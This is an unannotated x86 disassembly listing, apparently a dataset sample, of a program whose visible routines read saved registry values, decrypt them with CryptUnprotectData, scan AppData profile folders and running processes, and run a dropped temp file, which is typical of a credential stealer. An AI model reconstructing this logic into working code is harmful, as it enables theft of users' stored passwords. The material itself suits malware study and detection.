lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0x24 ]
push eax
lea eax [ ebp + 0x30 ]
push eax
push ebx
lea eax [ ebp + 0x3c ]
push eax
lea eax [ ebp - 0x160 ]
push eax
push [ ebp + 0x7c ]
mov [ ebp + 0x3c ] 0x104
mov [ ebp + 0x30 ] ebx
mov [ ebp + 0x60 ] 0x3fff
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp + 0x58 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
add ebp 0x70
leave
retn
mov [ ebp + 0x5c ] ebx
jbe r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp + 0x60 ]
push eax
lea eax [ ebp - 0x8160 ]
push eax
push [ ebp + 0x5c ]
mov [ ebp + 0x60 ] 0x3fff
push [ ebp + 0x7c ]
mov [ ebp - 0x8160 ] bx
call [ RegEnumValueW@IAT ]
test eax eax
jne r-xdata
inc [ ebp + 0x5c ]
mov eax [ ebp + 0x5c ]
cmp eax [ ebp + 0x58 ]
jb r-xdata
mov eax 0x2000
push eax
push 0x40
mov [ ebp + 0x68 ] eax
call [ GlobalAlloc@IAT ]
mov esi [ RegQueryValueExW@IAT ]
mov edi eax
mov [ ebp + 0x40 ] edi
jmp r-xdata
lea eax [ ebp + 0x68 ]
push eax
push edi
lea eax [ ebp + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x8160 ]
push eax
push [ ebp + 0x7c ]
call esi
cmp eax 0xea
je r-xdata
add [ ebp + 0x68 ] 0x400
push [ ebp + 0x68 ]
push edi
call sub_409ca6
pop ecx
pop ecx
mov edi eax
cmp eax ebx
jne r-xdata
push [ ebp + 0x40 ]
call [ GlobalFree@IAT ]
mov esi [ ebp + 0x60 ]
lea esi [ esi + esi + 0x2 ]
push esi
push 0x1
call sub_4091b9
push esi
push eax
mov [ ebp + 0x64 ] eax
mov eax [ ebp + 0x60 ]
add eax eax
push eax
lea eax [ ebp - 0x8160 ]
push eax
call sub_402d19
add esp 0x18
push [ ebp + 0x64 ]
lea ecx [ ebp + 0x44 ]
call sub_407d38
push [ ebp + 0x64 ]
call sub_4092d2
cmp [ ebp + 0x54 ] 0x1
pop ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_407ccf
push eax
lea ecx [ ebp + 0x44 ]
call sub_408111
lea ecx [ ebp - 0x54 ]
mov [ ebp + 0x6f ] al
call sub_407e74
cmp [ ebp + 0x6f ] bl
je r-xdata
cmp [ ebp + 0x54 ] 0x3
jne r-xdata
lea ecx [ ebp + 0x44 ]
call sub_407e74
push r--data
lea ecx [ ebp - 0x20 ]
call sub_407ccf
push eax
lea ecx [ ebp + 0x44 ]
call sub_408111
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x6f ] al
call sub_407e74
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp + 0x7 ]
call sub_407ccf
push eax
lea ecx [ ebp + 0x44 ]
call sub_408111
lea ecx [ ebp + 0x7 ]
mov [ ebp + 0x6f ] al
call sub_407e74
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x3a ]
call sub_407ccf
push eax
lea ecx [ ebp + 0x44 ]
call sub_408111
lea ecx [ ebp - 0x3a ]
mov [ ebp + 0x6f ] al
call sub_407e74
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x6 ]
call sub_407ccf
push eax
lea ecx [ ebp + 0x44 ]
call sub_408111
lea ecx [ ebp - 0x6 ]
mov [ ebp + 0x6f ] al
call sub_407e74
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x13 ]
call sub_407ccf
push eax
lea ecx [ ebp + 0x44 ]
call sub_408111
lea ecx [ ebp - 0x13 ]
mov [ ebp + 0x6f ] al
call sub_407e74
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x2d ]
call sub_407ccf
push eax
lea ecx [ ebp + 0x44 ]
call sub_408111
lea ecx [ ebp - 0x2d ]
mov [ ebp + 0x6f ] al
call sub_407e74
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x47 ]
call sub_407ccf
push eax
lea ecx [ ebp + 0x44 ]
call sub_408111
lea ecx [ ebp - 0x47 ]
mov [ ebp + 0x6f ] al
call sub_407e74
cmp [ ebp + 0x6f ] bl
je r-xdata
push [ ebp + 0x78 ]
push [ ebp + 0x7c ]
call sub_406186
pop ecx
pop ecx
lea eax [ ebp - 0x8160 ]
push eax
call [ lstrlenW@IAT ]
mov esi eax
add esi esi
push esi
call sub_409984
push esi
push eax
mov [ ebp + 0x64 ] eax
lea eax [ ebp - 0x8160 ]
push 0xffffffff
push eax
call sub_402d19
add esp 0x14
push [ ebp + 0x64 ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp + 0x78 ]
call sub_407870
push [ ebp + 0x64 ]
call sub_4092d2
push [ ebp + 0x68 ]
push 0x1
call sub_4091b9
push r--data
push [ ebp + 0x48 ]
mov [ ebp + 0x64 ] eax
mov esi edi
call sub_40a08b
add esp 0x14
test eax eax
je r-xdata
push [ ebp + 0x68 ]
push [ ebp + 0x64 ]
push [ ebp + 0x68 ]
push esi
call sub_402d19
add esp 0x10
mov esi eax
mov eax [ ebp + 0x68 ]
mov [ ebp + 0x28 ] eax
lea eax [ ebp + 0x34 ]
push eax
push 0x1
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp + 0x28 ]
inc edi
push eax
mov [ ebp + 0x2c ] edi
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
lea esi [ edi + 0x2 ]
push [ ebp + 0x64 ]
push esi
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp + 0x78 ]
call sub_407870
mov edi 0x400
push edi
call sub_409875
push edi
mov esi eax
push esi
push [ ebp + 0x34 ]
push [ ebp + 0x38 ]
call sub_402d19
mov edi eax
mov eax rw-data
add esp 0x14
push eax
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp + 0x78 ]
call sub_407870
push esi
push edi
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp + 0x78 ]
call sub_407870
push esi
call sub_40957e
pop ecx
push [ ebp + 0x38 ]
call [ LocalFree@IAT ]
jmp r-xdata
push [ ebp + 0x64 ]
call sub_40957e
pop ecx
sub_403747
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
leave
retn
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_403327
pop ecx
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_40377b
push ebp
mov ebp esp
sub esp 0xc
push edi
lea eax [ ebp - 0x8 ]
push eax
mov edi rw-data
push edi
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop edi
leave
retn
push ebx
push esi
push edi
call [ lstrlenA@IAT ]
push 0x400
mov esi eax
push 0x40
add esi edi
call [ GlobalAlloc@IAT ]
xor edi edi
mov ebx eax
mov [ ebp - 0x4 ] edi
call [ GlobalFree@IAT ]
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
pop esi
pop ebx
lea eax [ esi + 0x1 ]
push eax
mov [ esi ] 0x5c
call [ lstrcpyA@IAT ]
push [ ebp + 0x8 ]
call sub_403747
inc [ ebp - 0x4 ]
pop ecx
jmp r-xdata
push edi
mov [ ebp - 0xc ] 0x3ff
call [ SetLastError@IAT ]
push edi
push edi
push edi
push edi
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call [ RegEnumKeyExA@IAT ]
test eax eax
push ebx
jne r-xdata
sub_403813
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov esi rw-data
push esi
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop esi
leave
retn
push ebx
push edi
push 0x400
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
xor ebx ebx
push edi
call [ GlobalFree@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop ebx
push rw-data
push edi
push esi
push rw-data
push rw-data
call [ wsprintfA@IAT ]
push [ ebp + 0x8 ]
call sub_40377b
add esp 0x18
inc ebx
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push ebx
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x3ff
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
sub_40389f
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov esi rw-data
push esi
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop esi
leave
retn
push ebx
push edi
push 0x400
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
xor ebx ebx
call [ GlobalFree@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop ebx
push esi
push rw-data
push rw-data
call [ wsprintfA@IAT ]
push [ ebp + 0x8 ]
call sub_40377b
add esp 0x14
inc ebx
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push ebx
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x3ff
call [ RegEnumKeyExA@IAT ]
test eax eax
push edi
jne r-xdata
sub_403925
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
push [ rw-data ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x18 ]
call sub_4077a2
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
xor esi esi
cmp edi esi
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_40797c
pop edi
pop esi
leave
retn
cmp [ rw-data ] esi
jne r-xdata
push r--data
push edi
call [ GetProcAddress@IAT ]
cmp eax esi
je r-xdata
push esi
push esi
push esi
push rw-data
call eax
call sub_405f54
lea eax [ ebp - 0x18 ]
push eax
mov [ rw-data ] esi
call sub_4032c2
pop ecx
push [ rw-data ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x30 ]
call sub_4077a2
push rw-data
push rw-data
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x30 ]
push eax
mov [ rw-data ] 0x1
call sub_40377b
lea eax [ ebp - 0x30 ]
push eax
mov [ rw-data ] 0x2
call sub_403813
lea eax [ ebp - 0x30 ]
push eax
mov [ rw-data ] 0x3
call sub_40389f
add esp 0xc
push edi
call [ FreeLibrary@IAT ]
lea ecx [ ebp - 0x30 ]
call sub_40797c
sub_403a24
push ebx
push esi
push edi
mov esi 0x400
push esi
call sub_409984
push esi
mov ebx eax
call sub_409984
pop ecx
pop ecx
push ebx
push esi
mov edi eax
call [ GetTempPathA@IAT ]
push edi
push 0x0
push r--data
push ebx
call [ GetTempFileNameA@IAT ]
push r--data
push edi
call sub_409e53
call sub_405ef9
push r--data
push edi
call sub_40948c
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call sub_405f54
push 0x0
push edi
call [ WinExec@IAT ]
push ebx
call sub_4092d2
push edi
call sub_4092d2
pop ecx
pop ecx
pop edi
pop esi
pop ebx
retn
push [ rw-data ]
push r--data
push esi
call sub_40949f
push esi
call sub_409393
add esp 0x10
sub_403ab3
push ebp
mov ebp esp
mov eax 0x112c
call sub_408124
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x28 ]
call sub_4077a2
lea eax [ ebp - 0x10 ]
push eax
push 0x1000
lea eax [ ebp - 0x112c ]
push eax
call EnumProcesses
test eax eax
je r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40797c
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
push 0x2
shr eax 0x2
pop ecx
cmp eax ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + eax * 4 - 0x112c ]
mov esi r--data
lea edi [ ebp - 0x12c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0xfa
xor edi edi
lea eax [ ebp - 0x122 ]
push edi
push eax
call sub_409951
add esp 0xc
push ebx
push edi
push 0x410
call [ OpenProcess@IAT ]
cmp eax edi
mov [ ebp - 0xc ] eax
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
push 0x3ff
lea ecx [ ebp - 0x12c ]
push ecx
push edi
push eax
call GetModuleFileNameExA
lea eax [ ebp - 0x12c ]
push r--data
push eax
call sub_40a08b
cmp eax edi
pop ecx
pop ecx
je r-xdata
xor eax eax
push r--data
push eax
call sub_40a08b
pop ecx
pop ecx
jmp r-xdata
xor esi esi
push r--data
push eax
call sub_40a08b
pop ecx
pop ecx
mov esi eax
jmp r-xdata
cmp eax edi
je r-xdata
xor ebx ebx
push r--data
push esi
call sub_40a08b
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
cmp esi edi
je r-xdata
xor eax eax
push r--data
push eax
call sub_40a08b
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x12c ]
push r--data
push eax
call sub_40a08b
cmp esi edi
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x12c ]
push eax
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_406d42
lea eax [ ebp - 0x12c ]
push eax
call sub_406dab
add esp 0x10
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
cmp ebx edi
je r-xdata
cmp eax edi
je r-xdata
mov [ rw-data ] 0x1
sub_403c5b
push ebx
push esi
mov esi ecx
lea edx [ esi + 0x10c ]
push edi
mov ecx edx
call sub_403c4a
xor ebx ebx
push 0x1
mov [ esi + 0x314 ] bl
mov [ esi + 0x210 ] bl
mov [ edx ] bl
mov [ esi ] bl
call sub_409984
pop ecx
mov [ esi + 0x104 ] eax
mov [ eax ] bl
mov eax 0x30c0
push ebx
push eax
lea edi [ esi + 0x420 ]
push 0x4
mov [ esi + 0x41c ] ebx
mov [ edi ] eax
call [ HeapCreate@IAT ]
push [ edi ]
mov [ esi + 0x418 ] eax
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ esi + 0x108 ] eax
pop edi
mov eax esi
pop esi
pop ebx
retn
sub_403ce6
push ebx
push esi
mov esi ecx
inc [ esi + 0x41c ]
mov eax [ esi + 0x420 ]
mov ecx [ esi + 0x41c ]
xor ebx ebx
cmp eax ebx
push edi
jne r-xdata
imul ecx ecx 0x30c
cmp ecx eax
jbe r-xdata
xor edi edi
inc edi
push edi
mov [ esi + 0x314 ] bl
mov [ esi + 0x210 ] bl
mov [ esi + 0x10c ] bl
mov [ esi ] bl
call sub_409984
pop ecx
mov [ esi + 0x104 ] eax
mov [ eax ] bl
mov eax 0x30c0
push ebx
push eax
push 0x4
mov [ esi + 0x41c ] edi
mov [ esi + 0x420 ] eax
call [ HeapCreate@IAT ]
push [ esi + 0x420 ]
mov [ esi + 0x418 ] eax
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ esi + 0x108 ] eax
jmp r-xdata
mov eax [ esi + 0x41c ]
mov ecx [ esi + 0x108 ]
imul eax eax 0x30c
push [ esp + 0x10 ]
lea eax [ eax + ecx - 0x30c ]
push eax
call sub_409ed4
mov eax [ esi + 0x41c ]
mov ecx [ esi + 0x108 ]
imul eax eax 0x30c
push [ esp + 0x1c ]
lea eax [ eax + ecx - 0x208 ]
push eax
call sub_409ed4
mov eax [ esi + 0x41c ]
mov ecx [ esi + 0x108 ]
imul eax eax 0x30c
push [ esp + 0x28 ]
lea eax [ eax + ecx - 0x104 ]
push eax
call sub_409ed4
add esp 0x18
pop edi
pop esi
pop ebx
retn 0xc
add eax 0x30c0
push eax
lea edi [ esi + 0x108 ]
push [ edi ]
mov [ esi + 0x420 ] eax
push 0x8
push [ esi + 0x418 ]
call [ HeapReAlloc@IAT ]
mov [ edi ] eax
sub_403e2b
push esi
mov esi ecx
push edi
push [ esi + 0x104 ]
call sub_4092d2
mov edi [ esp + 0x14 ]
lea eax [ edi + 0x1 ]
push eax
call sub_409984
push edi
push [ esp + 0x18 ]
mov [ esi + 0x104 ] eax
mov [ eax + edi ] 0x0
push [ esi + 0x104 ]
call sub_4098f3
add esp 0x14
pop edi
pop esi
retn 0x8
sub_403e69
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
mov ecx edi
call sub_403c5b
xor ecx ecx
mov eax 0x4240
push ecx
mov [ edi ] cl
push eax
lea edi [ esi + 0x430 ]
push 0x4
mov [ esi + 0x10c ] ecx
mov [ esi + 0x42c ] ecx
mov [ edi ] eax
call [ HeapCreate@IAT ]
push [ edi ]
mov [ esi + 0x428 ] eax
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
pop edi
mov eax esi
pop esi
retn
sub_403ece
push esi
mov esi ecx
inc [ esi + 0x42c ]
xor ecx ecx
cmp [ esi + 0x430 ] ecx
jne r-xdata
mov ecx [ esi + 0x42c ]
mov eax [ esi + 0x430 ]
imul ecx ecx 0x424
cmp ecx eax
jbe r-xdata
mov eax 0x4240
push ecx
push eax
push 0x4
mov [ esi + 0x4 ] cl
mov [ esi + 0x10c ] ecx
mov [ esi + 0x42c ] 0x1
mov [ esi + 0x430 ] eax
call [ HeapCreate@IAT ]
push [ esi + 0x430 ]
mov [ esi + 0x428 ] eax
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
mov eax [ esi + 0x42c ]
mov ecx [ esi ]
imul eax eax 0x424
push [ esp + 0x8 ]
lea eax [ eax + ecx - 0x424 ]
push eax
call sub_409ed4
pop ecx
pop ecx
pop esi
retn 0x4
add eax 0x4240
push eax
push [ esi ]
mov [ esi + 0x430 ] eax
push 0x8
push [ esi + 0x428 ]
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
sub_403fa6
push ebp
mov ebp esp
sub esp 0x104
push ebx
push esi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x103 ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x104 ] bl
call sub_409951
push r--data
push [ ebp + 0x8 ]
call sub_409e8e
add esp 0x14
test eax eax
je r-xdata
xor al al
push r--data
push [ ebp + 0x8 ]
call sub_409e8e
test eax eax
pop ecx
pop ecx
je r-xdata
add esi 0xc
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_409ed4
mov esi r--data
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_409e53
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_409e53
add esp 0x18
cmp [ ebp + 0xc ] ebx
je r-xdata
push ebx
push 0x2000000
push 0x3
push ebx
push 0x1
push 0x80000000
lea eax [ ebp - 0x104 ]
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
setne al
jmp r-xdata
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_409e53
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_409e53
add esp 0x10
pop esi
pop ebx
leave
retn 0x8
sub_404095
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x10b ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x10c ] bl
call sub_409951
add esp 0xc
push 0x40
pop edi
push ebx
push edi
push 0x4
mov [ ebp - 0x4 ] edi
mov [ esi ] ebx
call [ HeapCreate@IAT ]
push edi
push 0x8
push eax
mov [ esi + 0x4 ] eax
call [ HeapAlloc@IAT ]
cmp eax ebx
mov [ esi + 0x8 ] eax
jne r-xdata
lea eax [ esi + 0xc ]
push eax
push ebx
push ebx
push 0x1a
push ebx
call [ SHGetFolderPathA@IAT ]
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call [ HeapDestroy@IAT ]
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x4
mov edi r--data
push edi
lea eax [ esi + 0xc ]
push edi
push eax
call sub_40a08b
pop ecx
pop ecx
inc eax
push eax
call sub_40a08b
mov [ eax ] bl
lea eax [ esi + 0xc ]
push eax
lea eax [ ebp - 0x10c ]
push eax
call sub_409ed4
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_409e53
add esp 0x18
lea eax [ ebp - 0x24c ]
push eax
lea eax [ ebp - 0x10c ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
je r-xdata
test [ ebp - 0x24c ] 0x10
jbe r-xdata
lea eax [ ebp - 0x24c ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x220 ]
push eax
mov ecx esi
call sub_403fa6
test al al
je r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
inc [ esi ]
mov eax [ esi ]
shl eax 0x2
cmp eax [ ebp - 0x4 ]
jbe r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
add [ ebp - 0x4 ] 0x40
push [ ebp - 0x4 ]
push [ esi + 0x8 ]
push 0x8
push [ esi + 0x4 ]
call [ HeapReAlloc@IAT ]
mov [ esi + 0x8 ] eax
push [ esi + 0x4 ]
call [ HeapDestroy@IAT ]
mov [ esi ] ebx
jmp r-xdata
mov ecx [ esi ]
cmp [ eax + ecx * 4 - 0x4 ] ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ esi + 0xc ]
push eax
mov eax [ esi ]
push [ ecx + eax * 4 - 0x4 ]
call sub_409ed4
mov eax [ esi ]
mov ecx [ esi + 0x8 ]
push edi
push [ ecx + eax * 4 - 0x4 ]
call sub_409e53
mov ecx [ esi + 0x8 ]
lea eax [ ebp - 0x220 ]
push eax
mov eax [ esi ]
push [ ecx + eax * 4 - 0x4 ]
call sub_409e53
add esp 0x18
push 0x104
push 0x8
push [ esi + 0x4 ]
call [ HeapAlloc@IAT ]
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov [ edx + ecx * 4 - 0x4 ] eax
sub_40426c
push esi
mov esi [ esp + 0x8 ]
push edi
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push esi
call sub_409433
push esi
mov edi eax
call sub_409f34
add esp 0x10
dec eax
test eax eax
mov ecx eax
jle r-xdata
test ecx ecx
jl r-xdata
mov dl [ ecx + esi ]
cmp dl 0xd
je r-xdata
mov eax edi
pop edi
pop esi
retn
lea edx [ ecx + 0x1 ]
cmp edx eax
jg r-xdata
dec ecx
test ecx ecx
jg r-xdata
cmp dl 0xa
je r-xdata
mov [ ecx + esi + 0x1 ] 0x0
cmp dl 0x9
jne r-xdata
sub_4042be
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x107 ]
push ebx
push eax
mov [ ebp - 0x108 ] bl
call sub_409951
push [ ebp + 0xc ]
lea eax [ ebp - 0x108 ]
push eax
call sub_409ed4
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_409e53
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_409e53
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_40a08b
mov [ eax ] 0x5c
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_40948c
mov edi eax
add esp 0x34
cmp edi ebx
jne r-xdata
push 0x2
push ebx
push edi
call sub_409664
push edi
call sub_4096c0
push ebx
push ebx
push edi
mov [ ebp - 0x4 ] eax
call sub_409664
push [ ebp - 0x4 ]
call sub_409984
push edi
push [ ebp - 0x4 ]
mov esi eax
push 0x1
push esi
call sub_40954d
push edi
call sub_409393
add esp 0x34
push 0x1
mov [ ebp - 0x4 ] ebx
call sub_409984
mov esi eax
pop ecx
mov [ esi ] bl
jmp r-xdata
push [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
push esi
call sub_403f95
mov ecx [ ebp + 0x8 ]
dec eax
push eax
call sub_403f79
mov ecx eax
call sub_403e2b
push esi
call sub_4092d2
pop ecx
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
sub_4043b8
push ebp
mov ebp esp
sub esp 0x404
push 0x3ff
lea eax [ ebp - 0x403 ]
push 0x0
push eax
mov [ ebp - 0x404 ] 0x0
call sub_409951
push [ ebp + 0xc ]
lea eax [ ebp - 0x404 ]
push eax
call sub_409ed4
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_409e53
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_409e53
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_40a08b
mov [ eax ] 0x5c
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_40948c
add esp 0x34
test eax eax
mov [ ebp - 0x4 ] eax
jne r-xdata
push eax
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call sub_40426c
add esp 0xc
test eax eax
je r-xdata
xor al al
leave
retn
push [ ebp - 0x4 ]
call sub_409393
pop ecx
mov al 0x1
leave
retn
push edi
push ebx
mov edi r--data
push esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call sub_40426c
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebx + 0x2 ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_40a08b
mov ebx eax
test ebx ebx
pop ecx
pop ecx
je r-xdata
jmp r-xdata
cmp [ ebx + 0x3 ] 0x0
je r-xdata
pop esi
pop ebx
pop edi
push edi
push eax
call sub_40a08b
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push r--data
push ebx
call sub_40a08b
test eax eax
pop ecx
pop ecx
je r-xdata
cmp eax esi
jb r-xdata
push edi
inc esi
push esi
call sub_40a08b
mov esi eax
inc esi
push edi
push esi
call sub_40a08b
sub eax esi
push eax
push esi
push [ ebp + 0x8 ]
call sub_409fb8
add esp 0x1c
sub_4044fd
push ebp
mov ebp esp
sub esp 0x71c
push ebx
push esi
push edi
mov ebx 0x103
push ebx
lea eax [ ebp - 0x207 ]
push 0x0
push eax
mov [ ebp - 0x208 ] 0x0
call sub_409951
mov esi r--data
lea edi [ ebp - 0x410 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0xf7
xor esi esi
lea eax [ ebp - 0x403 ]
push esi
push eax
call sub_409951
push ebx
lea eax [ ebp - 0x103 ]
push esi
push eax
mov [ ebp - 0x104 ] 0x0
call sub_409951
push ebx
lea eax [ ebp - 0x30b ]
push esi
push eax
mov [ ebp - 0x30c ] 0x0
call sub_409951
push ebx
lea eax [ ebp - 0x71b ]
push esi
push eax
mov [ ebp - 0x71c ] 0x0
call sub_409951
push ebx
lea eax [ ebp - 0x617 ]
push esi
push eax
mov [ ebp - 0x618 ] 0x0
call sub_409951
add esp 0x48
push ebx
lea eax [ ebp - 0x513 ]
push esi
push eax
mov [ ebp - 0x514 ] 0x0
call sub_409951
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4042be
push [ ebp + 0xc ]
lea eax [ ebp - 0x410 ]
push eax
call sub_4043b8
push [ ebp + 0xc ]
lea eax [ ebp - 0x208 ]
push eax
call sub_409ed4
lea eax [ ebp - 0x208 ]
push r--data
push eax
call sub_409e53
lea eax [ ebp - 0x410 ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call sub_409e53
lea eax [ ebp - 0x208 ]
push r--data
push eax
call sub_40a08b
mov [ eax ] 0x5c
push r--data
lea eax [ ebp - 0x208 ]
push eax
call sub_40948c
mov edi eax
add esp 0x44
cmp edi esi
jne r-xdata
push edi
mov esi 0x104
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_40426c
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_40a08b
lea ecx [ ebp - 0x104 ]
add esp 0x14
cmp eax ecx
jne r-xdata
xor al al
jmp r-xdata
mov eax ecx
push eax
call sub_409f34
inc eax
push eax
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x30c ]
push eax
call sub_4098f3
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_40426c
add esp 0x1c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
call sub_409393
pop ecx
mov al 0x1
mov ebx r--data
lea eax [ ebp - 0x104 ]
push eax
call sub_409f34
inc eax
push eax
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x30c ]
push eax
call sub_4098f3
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_40426c
add esp 0x1c
test eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x30c ]
push ebx
push eax
call sub_409e8e
test eax eax
pop ecx
pop ecx
jne r-xdata
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_40426c
lea eax [ ebp - 0x104 ]
push ebx
push eax
call sub_409e8e
add esp 0x14
test eax eax
jne r-xdata
push edi
lea eax [ ebp - 0x514 ]
push esi
push eax
call sub_40426c
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_40426c
push edi
lea eax [ ebp - 0x618 ]
push esi
push eax
call sub_40426c
push edi
lea eax [ ebp - 0x71c ]
